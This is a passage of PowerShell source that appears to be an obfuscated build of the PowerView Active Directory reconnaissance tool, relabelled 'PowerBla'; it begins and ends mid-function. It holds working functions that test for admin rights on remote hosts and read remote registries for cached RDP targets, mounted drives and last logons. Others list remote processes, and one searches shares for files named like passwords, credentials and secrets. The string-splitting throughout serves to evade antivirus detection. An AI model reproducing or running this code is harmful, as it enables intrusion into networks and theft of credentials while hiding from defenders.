                            $RDPSession

                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    &('Write-'+'V'+'erb'+'ose') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                &('Wr'+'ite'+'-Verbose') ('[Get'+'-N'+'etRDPSe'+'ssion] '+'Error'+' '+'open'+'i'+'ng '+'t'+'he '+'Remot'+'e '+'De'+'skt'+'op '+'Se'+'ssio'+'n '+'H'+'ost '+'(RD'+' '+'S'+'e'+'ssion '+'Ho'+'st) '+'serve'+'r'+' '+'f'+'or: '+"$ComputerName")
            }
        }
    }

    END {
        if ($LogonToken) {
            &('Invok'+'e'+'-Re'+'vertT'+'o'+'Self') -TokenHandle $LogonToken
        }
    }
}


function Test-AdminAccess {


    [OutputType(('Powe'+'rB'+'la'+'.Ad'+'minAcce'+'s'+'s'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('H'+'ostNa'+'me'), ('dns'+'h'+'ostname'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('loc'+'alho'+'st'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[('Credent'+'ia'+'l')]) {
            $LogonToken = &('Invo'+'ke-UserI'+'mper'+'so'+'na'+'tion') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", ('Services'+'Activ'+'e'), 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $IsAdmin = &('New-O'+'bj'+'ect') PSObject
            $IsAdmin | &('Add'+'-'+'M'+'ember') Noteproperty ('Compute'+'rN'+'ame') $Computer

            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | &('Add'+'-Me'+'mber') Noteproperty ('IsAdmi'+'n') $True
            }
            else {
                &('W'+'rite-Verbo'+'s'+'e') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                $IsAdmin | &('Add'+'-'+'Mem'+'ber') Noteproperty ('Is'+'Adm'+'in') $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, ('Pow'+'erBl'+'a.'+'A'+'dminAcces'+'s'))
            $IsAdmin
        }
    }

    END {
        if ($LogonToken) {
            &('In'+'voke'+'-Rev'+'ertT'+'o'+'Self') -TokenHandle $LogonToken
        }
    }
}


function Get-NetComputerSiteName {


    [OutputType(('PowerBla.Comp'+'u'+'t'+'e'+'rS'+'ite'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Ho'+'stNam'+'e'), ('dnshos'+'tn'+'am'+'e'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('l'+'o'+'calhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[('Crede'+'nt'+'ia'+'l')]) {
            $LogonToken = &('I'+'nvo'+'ke-U'+'serImpe'+'r'+'s'+'onation') -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | &('Sele'+'c'+'t-Object') -ExpandProperty HostName
            }
            else {
                $IPAddress = @(&('Resol'+'ve-'+'IP'+'Addre'+'ss') -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = &('N'+'e'+'w-O'+'bject') PSObject
            $ComputerSite | &('Ad'+'d-M'+'emb'+'er') Noteproperty ('Co'+'mp'+'uterNam'+'e') $Computer
            $ComputerSite | &('Add'+'-'+'Memb'+'er') Noteproperty ('I'+'PAddre'+'ss') $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | &('Add-M'+'emb'+'er') Noteproperty ('Site'+'N'+'ame') $Sitename
            }
            else {
                &('Writ'+'e-Verb'+'o'+'se') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                $ComputerSite | &('A'+'dd'+'-Member') Noteproperty ('SiteN'+'a'+'me') ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, ('PowerBla.C'+'om'+'puterSi'+'te'))

            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            &('Invoke'+'-Rev'+'e'+'r'+'t'+'ToSelf') -TokenHandle $LogonToken
        }
    }
}


function Get-WMIRegProxy {


    [OutputType(('P'+'owerB'+'la.Pro'+'x'+'yS'+'et'+'tings'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('H'+'ostNam'+'e'), ('dns'+'host'+'name'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    ('Li'+'st') = $True
                    ('Cl'+'ass') = ('St'+'d'+'R'+'egProv')
                    ('Nam'+'espa'+'ce') = (('ro'+'otq'+'U9'+'default').rePlAce('qU9','\'))
                    ('Co'+'mp'+'uter'+'name') = $Computer
                    ('Error'+'A'+'ction') = ('St'+'op')
                }
                if ($PSBoundParameters[('Cre'+'d'+'ential')]) { $WmiArguments[('Cred'+'ent'+'ial')] = $Credential }

                $RegProvider = &('Ge'+'t'+'-Wmi'+'Object') @WmiArguments
                $Key = (('SOFT'+'WAR'+'ETFCM'+'i'+'cro'+'so'+'ftTF'+'CW'+'indow'+'sT'+'FCCurrentVer'+'s'+'ionTFCInt'+'e'+'rnet'+' Sett'+'i'+'ng'+'s').rEpLACe(([Char]84+[Char]70+[Char]67),[sTrinG][Char]92))

                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, ('Pr'+'oxySer'+'ver')).sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, ('A'+'ut'+'oConfigURL')).sValue

                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (&('N'+'e'+'w-Object') Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                        &('Wr'+'ite-Warni'+'ng') ('[Get'+'-'+'WMIRegProxy]'+' '+'Error'+' '+'con'+'ne'+'cting '+'t'+'o '+'Au'+'toC'+'on'+'fi'+'gURL '+': '+"$AutoConfigURL")
                    }
                }

                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = &('Ne'+'w-O'+'bje'+'ct') PSObject
                    $Out | &('Ad'+'d-Memb'+'er') Noteproperty ('C'+'omputer'+'N'+'ame') $Computer
                    $Out | &('Add'+'-Mem'+'ber') Noteproperty ('ProxySe'+'rv'+'er') $ProxyServer
                    $Out | &('Add-'+'Membe'+'r') Noteproperty ('AutoCon'+'fi'+'g'+'URL') $AutoConfigURL
                    $Out | &('A'+'dd-Memb'+'er') Noteproperty ('Wpa'+'d') $Wpad
                    $Out.PSObject.TypeNames.Insert(0, ('P'+'owerBla.Proxy'+'Sett'+'i'+'ngs'))
                    $Out
                }
                else {
                    &('W'+'ri'+'te-Warnin'+'g') ('['+'Get-WMIReg'+'P'+'roxy] '+'No'+' '+'p'+'roxy'+' '+'s'+'e'+'ttings '+'fo'+'und '+'fo'+'r '+"$ComputerName")
                }
            }
            catch {
                &('Wr'+'ite-W'+'arn'+'ing') ('['+'Get-W'+'MI'+'Re'+'gPr'+'oxy] '+'Error'+' '+'enume'+'ra'+'t'+'ing '+'pr'+'o'+'xy '+'se'+'tti'+'n'+'gs '+'f'+'or '+"$ComputerName "+': '+"$_")
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {


    [OutputType(('Po'+'wer'+'B'+'la'+'.LastLoggedO'+'nU'+'s'+'er'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('HostNa'+'me'), ('dn'+'shost'+'name'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('localho'+'s'+'t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $HKLM = 2147483650

            $WmiArguments = @{
                ('Lis'+'t') = $True
                ('Clas'+'s') = ('StdReg'+'Pr'+'ov')
                ('Name'+'spa'+'ce') = (('roo'+'t'+'zHCde'+'faul'+'t').RePlACe(([char]122+[char]72+[char]67),[striNg][char]92))
                ('Comput'+'e'+'rname') = $Computer
                ('E'+'rrorAc'+'tion') = ('Si'+'len'+'tlyCon'+'tinue')
            }
            if ($PSBoundParameters[('Creden'+'t'+'ia'+'l')]) { $WmiArguments[('Credent'+'i'+'al')] = $Credential }

            try {
                $Reg = &('G'+'et-'+'WmiObje'+'ct') @WmiArguments

                $Key = (('SO'+'FTWARE{0'+'}Mic'+'r'+'os'+'of'+'t{0}W'+'i'+'n'+'dows{0'+'}Curre'+'ntVe'+'r'+'sion{0}Au'+'thentica'+'tion{0}LogonUI')-f [char]92)
                $Value = ('LastLogge'+'dO'+'n'+'Use'+'r')
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = &('Ne'+'w-'+'Object') PSObject
                $LastLoggedOn | &('Add'+'-'+'Memb'+'er') Noteproperty ('Comp'+'uter'+'Name') $Computer
                $LastLoggedOn | &('Add-'+'Memb'+'er') Noteproperty ('Las'+'t'+'Lo'+'ggedOn') $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, ('Power'+'Bla.La'+'stL'+'oggedO'+'nUser'))
                $LastLoggedOn
            }
            catch {
                &('W'+'rite-Warnin'+'g') ('[Get-'+'WMI'+'Re'+'gLastLo'+'gg'+'edOn'+'] '+'Erro'+'r '+'open'+'i'+'ng '+'r'+'emote '+'reg'+'is'+'try '+'on'+' '+"$Computer. "+'Re'+'mote '+'re'+'gistry '+'l'+'ik'+'ely '+'n'+'ot '+'enab'+'led'+'.')
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {


    [OutputType(('P'+'owerB'+'la.CachedR'+'D'+'PC'+'onnec'+'tion'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Ho'+'stNam'+'e'), ('dnshost'+'na'+'m'+'e'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('lo'+'c'+'alhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $HKU = 2147483651

            $WmiArguments = @{
                ('L'+'ist') = $True
                ('C'+'lass') = ('StdReg'+'P'+'rov')
                ('Name'+'spa'+'ce') = (('roo'+'tig'+'cd'+'efault').rePlACE('igc','\'))
                ('Comput'+'ernam'+'e') = $Computer
                ('E'+'rrorActi'+'on') = ('Sto'+'p')
            }
            if ($PSBoundParameters[('Cr'+'e'+'dent'+'ial')]) { $WmiArguments[('Crede'+'n'+'tial')] = $Credential }

            try {
                $Reg = &('Get-W'+'miObje'+'ct') @WmiArguments

                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | &('Where-Ob'+'jec'+'t') { $_ -match (('S-1-'+'5-21-[0'+'-9]'+'+-'+'[0-9'+']'+'+-'+'[0'+'-9]'+'+-['+'0-9'+']+tgB').RepLACE(([cHAr]116+[cHAr]103+[cHAr]66),[StRiNg][cHAr]36)) }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[('Cre'+'d'+'en'+'tial')]) {
                            $UserName = &('Conv'+'ert'+'Fr'+'om'+'-SID') -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = &('C'+'onve'+'r'+'tFrom-SI'+'D') -ObjectSid $UserSID
                        }

                        $ConnectionKeys = $Reg.EnumValues($HKU,("$UserSID\Software\Microsoft\Terminal "+'Serve'+'r '+('Clie'+'nt'+'7NqDefaul'+'t').repLacE('7Nq','\'))).sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            if ($Connection -match ('M'+'RU.*')) {
                                $TargetServer = $Reg.GetStringValue($HKU, ("$UserSID\Software\Microsoft\Terminal "+'S'+'erv'+'er '+(('Clien'+'tD'+'YID'+'efault') -rePLacE  ([CHaR]68+[CHaR]89+[CHaR]73),[CHaR]92)), $Connection).sValue

                                $FoundConnection = &('New-'+'Obj'+'ec'+'t') PSObject
                                $FoundConnection | &('A'+'dd'+'-Member') Noteproperty ('Com'+'p'+'ut'+'erName') $Computer
                                $FoundConnection | &('Add-M'+'emb'+'er') Noteproperty ('Us'+'e'+'rName') $UserName
                                $FoundConnection | &('Add-M'+'embe'+'r') Noteproperty ('U'+'ser'+'SID') $UserSID
                                $FoundConnection | &('A'+'dd-Mem'+'ber') Noteproperty ('Targe'+'t'+'Server') $TargetServer
                                $FoundConnection | &('A'+'dd-Mem'+'ber') Noteproperty ('Use'+'rnameHin'+'t') $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, ('PowerBla.Cach'+'ed'+'RDPConn'+'ect'+'ion'))
                                $FoundConnection
                            }
                        }

                        $ServerKeys = $Reg.EnumKey($HKU,("$UserSID\Software\Microsoft\Terminal "+'Se'+'rver '+(('C'+'l'+'ientm'+'av'+'Serve'+'rs') -crEPlacE([chaR]109+[chaR]97+[chaR]118),[chaR]92))).sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, ("$UserSID\Software\Microsoft\Terminal "+'Server'+' '+"Client\Servers\$Server"), ('Us'+'ernameHi'+'n'+'t')).sValue

                            $FoundConnection = &('N'+'e'+'w-'+'Object') PSObject
                            $FoundConnection | &('Ad'+'d'+'-Member') Noteproperty ('ComputerNa'+'m'+'e') $Computer
                            $FoundConnection | &('A'+'dd-Me'+'mber') Noteproperty ('Us'+'erNam'+'e') $UserName
                            $FoundConnection | &('A'+'dd-Mem'+'ber') Noteproperty ('UserS'+'ID') $UserSID
                            $FoundConnection | &('A'+'dd'+'-Member') Noteproperty ('TargetS'+'erve'+'r') $Server
                            $FoundConnection | &('Add-Memb'+'e'+'r') Noteproperty ('Us'+'e'+'rname'+'Hint') $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, ('PowerB'+'la.'+'Cac'+'hedR'+'DP'+'Conn'+'e'+'c'+'tion'))
                            $FoundConnection
                        }
                    }
                    catch {
                        &('W'+'rite-Verb'+'os'+'e') ('[Get-'+'WM'+'I'+'RegCach'+'edR'+'D'+'P'+'Connectio'+'n] '+'Err'+'o'+'r: '+"$_")
                    }
                }
            }
            catch {
                &('Write'+'-Wa'+'rni'+'ng') ('[Get-WMIRegCa'+'c'+'he'+'dRDPC'+'onnection'+'] '+'Er'+'r'+'or '+'ac'+'cessing'+' '+"$Computer, "+'l'+'ik'+'ely '+'insu'+'f'+'fici'+'ent'+' '+'pe'+'rmiss'+'ions '+'o'+'r '+'fir'+'ewall'+' '+'r'+'ules '+'on'+' '+'h'+'ost: '+"$_")
            }
        }
    }
}


function Get-WMIRegMountedDrive {


    [OutputType(('Powe'+'rBl'+'a.'+'RegMountedD'+'ri'+'ve'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Host'+'N'+'ame'), ('d'+'nsh'+'ostname'), ('n'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('loca'+'lhos'+'t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $HKU = 2147483651

            $WmiArguments = @{
                ('Li'+'st') = $True
                ('Clas'+'s') = ('St'+'dR'+'egProv')
                ('Na'+'mespac'+'e') = (('root'+'iKJd'+'efa'+'ult')-rePlAce 'iKJ',[chAR]92)
                ('C'+'ompute'+'rname') = $Computer
                ('Err'+'o'+'rAction') = ('St'+'op')
            }
            if ($PSBoundParameters[('Cr'+'eden'+'tial')]) { $WmiArguments[('Creden'+'tia'+'l')] = $Credential }

            try {
                $Reg = &('G'+'et-'+'WmiO'+'b'+'ject') @WmiArguments

                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | &('Where-Ob'+'j'+'ec'+'t') { $_ -match ((('S-1-5-'+'21'+'-['+'0-9]+-['+'0-9]+-[0'+'-9]'+'+'+'-[0-9]+EQd')-cRePLaCe([CHAR]69+[CHAR]81+[CHAR]100),[CHAR]36)) }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[('C'+'rede'+'ntial')]) {
                            $UserName = &('Convert'+'Fr'+'o'+'m-SI'+'D') -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = &('Conve'+'r'+'t'+'From'+'-SID') -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", ('Pr'+'o'+'vide'+'rName')).sValue
                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", ('Remo'+'tePa'+'th')).sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", ('Use'+'rNam'+'e')).sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = &('New-'+'Obj'+'ect') PSObject
                                $MountedDrive | &('A'+'d'+'d-'+'Member') Noteproperty ('Com'+'puter'+'Nam'+'e') $Computer
                                $MountedDrive | &('Ad'+'d'+'-M'+'ember') Noteproperty ('Us'+'er'+'Name') $UserName
                                $MountedDrive | &('Ad'+'d'+'-Member') Noteproperty ('UserSI'+'D') $UserSID
                                $MountedDrive | &('Ad'+'d-M'+'ember') Noteproperty ('DriveL'+'et'+'ter') $DriveLetter
                                $MountedDrive | &('Ad'+'d-Membe'+'r') Noteproperty ('Pr'+'ovid'+'erName') $ProviderName
                                $MountedDrive | &('Add-M'+'e'+'mber') Noteproperty ('RemoteP'+'at'+'h') $RemotePath
                                $MountedDrive | &('A'+'dd-Mem'+'ber') Noteproperty ('DriveU'+'serNam'+'e') $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, ('P'+'ower'+'B'+'la'+'.'+'RegMoun'+'tedDrive'))
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        &('W'+'rite-Ve'+'rbose') ('[Ge'+'t-WM'+'I'+'Reg'+'M'+'oun'+'te'+'dDrive] '+'Error:'+' '+"$_")
                    }
                }
            }
            catch {
                &('Write-War'+'nin'+'g') ('[Get-W'+'MIR'+'eg'+'Mounted'+'Drive'+'] '+'E'+'rro'+'r '+'a'+'ccessi'+'n'+'g '+"$Computer, "+'l'+'ikely '+'i'+'nsuff'+'icie'+'nt '+'pe'+'rmis'+'sions'+' '+'o'+'r '+'firewa'+'l'+'l '+'ru'+'les'+' '+'on'+' '+'ho'+'st: '+"$_")
            }
        }
    }
}


function Get-WMIProcess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'S'+'h'+'ouldPro'+'cess'), '')]
    [OutputType(('Pow'+'e'+'rB'+'la.U'+'serProcess'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('HostN'+'a'+'me'), ('d'+'nsho'+'stnam'+'e'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ('lo'+'c'+'alhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    ('Comput'+'er'+'Nam'+'e') = $ComputerName
                    ('Cla'+'ss') = ('Win32_pr'+'oce'+'ss')
                }
                if ($PSBoundParameters[('Cre'+'d'+'ent'+'ial')]) { $WmiArguments[('Cred'+'ent'+'ial')] = $Credential }
                &('Get-'+'W'+'MIobjec'+'t') @WmiArguments | &('ForEac'+'h-'+'Object') {
                    $Owner = $_.getowner();
                    $Process = &('New-O'+'bj'+'ect') PSObject
                    $Process | &('A'+'dd-Memb'+'er') Noteproperty ('Co'+'mputer'+'N'+'ame') $Computer
                    $Process | &('Ad'+'d-'+'Memb'+'er') Noteproperty ('Pr'+'ocessN'+'ame') $_.ProcessName
                    $Process | &('A'+'dd-Me'+'m'+'ber') Noteproperty ('P'+'roc'+'essID') $_.ProcessID
                    $Process | &('A'+'d'+'d-Member') Noteproperty ('D'+'omai'+'n') $Owner.Domain
                    $Process | &('Add'+'-Membe'+'r') Noteproperty ('U'+'ser') $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, ('PowerBla'+'.U'+'s'+'e'+'rProce'+'ss'))
                    $Process
                }
            }
            catch {
                &('W'+'rite-Verbo'+'s'+'e') ('[G'+'et-WMIP'+'rocess]'+' '+'Erro'+'r '+'en'+'umerat'+'ing '+'re'+'m'+'ote '+'process'+'es'+' '+'on'+' '+"'$Computer', "+'ac'+'cess '+'li'+'k'+'ely '+'denie'+'d:'+' '+"$_")
            }
        }
    }
}


function Find-InterestingFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShouldP'+'roce'+'ss'), '')]
    [OutputType(('PowerB'+'la'+'.Foun'+'d'+'File'))]
    [CmdletBinding(DefaultParameterSetName = {'File'+'Speci'+'f'+'ication'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = (('.T'+'Am')-REplAce  'TAm',[cHAR]92),

        [Parameter(ParameterSetName = "fILeSPE`c`IFicA`T`IOn")]
        [ValidateNotNullOrEmpty()]
        [Alias(('SearchTer'+'m'+'s'), ('T'+'erms'))]
        [String[]]
        $Include = @(('*p'+'a'+'ssword*'), ('*se'+'nsit'+'ive*'), ('*admin'+'*'), ('*'+'log'+'in*'), ('*'+'secre'+'t*'), ('u'+'nattend'+'*.'+'xml'), ('*.v'+'mdk'), ('*cr'+'eds*'), ('*creden'+'t'+'ial'+'*'), ('*.'+'c'+'onfig')),

        [Parameter(ParameterSetName = "fiLes`P`Ec`if`icat`ion")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = "Fi`lEs`Pe`cif`iCaTioN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = "FiLe`spEC`I`FIc`ATIon")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = "OF`F`iced`Ocs")]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = "frEsHE`x`eS")]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = "f`Ilesp`E`cIfiCatIon")]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = "FI`L`eSPE`CIfi`CA`TIon")]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            ('Rec'+'u'+'rse') = $True
            ('Error'+'Ac'+'tion') = ('S'+'i'+'lently'+'Continue')
            ('Inclu'+'de') = $Include
        }
        if ($PSBoundParameters[('Offi'+'ceD'+'oc'+'s')]) {
            $SearcherArguments[('Includ'+'e')] = @(('*.do'+'c'), ('*.doc'+'x'), ('*.xl'+'s'), ('*.x'+'lsx'), ('*.pp'+'t'), ('*.p'+'ptx'))
        }
        elseif ($PSBoundParameters[('Fre'+'s'+'hEXEs')]) {
            $LastAccessTime = (&('Get-D'+'a'+'te')).AddDays(-7).ToString(('MM/dd'+'/yy'+'yy'))
            $SearcherArguments[('I'+'nclude')] = @(('*.ex'+'e'))
        }
        $SearcherArguments[('F'+'orce')] = -not $PSBoundParameters[('E'+'xc'+'lu'+'deHidden')]

        $MappedComputers = @{}

        function Test-Write {
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match (('nMFnM'+'FnM'+'FnM'+'F.*nMF'+'nMF.*').RePlAce(([ChAr]110+[ChAr]77+[ChAr]70),[StRinG][ChAr]92))) -and ($PSBoundParameters[('Cred'+'entia'+'l')])) {
                $HostComputer = (&('New-Obj'+'e'+'ct') System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    &('Add'+'-Rem'+'o'+'teConnect'+'io'+'n') -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments[('P'+'ath')] = $TargetPath
            &('Get-Ch'+'ild'+'Item') @SearcherArguments | &('For'+'Each-'+'Objec'+'t') {
                $Continue = $True
                if ($PSBoundParameters[('E'+'xclude'+'Fo'+'ld'+'ers')] -and ($_.PSIsContainer)) {
                    &('Writ'+'e'+'-Verbos'+'e') "Excluding: $($_.FullName) "
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[('LastW'+'ri'+'teTime')] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[('C'+'reationT'+'i'+'me')] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[('CheckWrit'+'eAc'+'ce'+'ss')] -and (-not (&('T'+'est-Wri'+'te') -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        ('Pat'+'h') = $_.FullName
                        ('Ow'+'ner') = $((&('G'+'et-Ac'+'l') $_.FullName).Owner)
                        ('Last'+'Ac'+'cessTi'+'me') = $_.LastAccessTime
                        ('L'+'astWrit'+'eT'+'ime') = $_.LastWriteTime
                        ('Cr'+'e'+'ationTime') = $_.CreationTime
                        ('Len'+'gth') = $_.Length
                    }
                    $FoundFile = &('N'+'ew-Objec'+'t') -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, ('Power'+'Bl'+'a'+'.FoundFil'+'e'))
                    $FoundFile
                }
            }
        }
    }

    END {
        $MappedComputers.Keys | &('Remo'+'v'+'e-RemoteC'+'onnectio'+'n')
    }
}



function New-ThreadedFunction {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSU'+'s'+'eShouldPro'+'cessF'+'orSt'+'a'+'t'+'eCh'+'angi'+'ngF'+'unctions'), '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    BEGIN {
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        if (-not $NoImports) {
            $MyVars = &('G'+'et'+'-Va'+'riable') -Scope 2

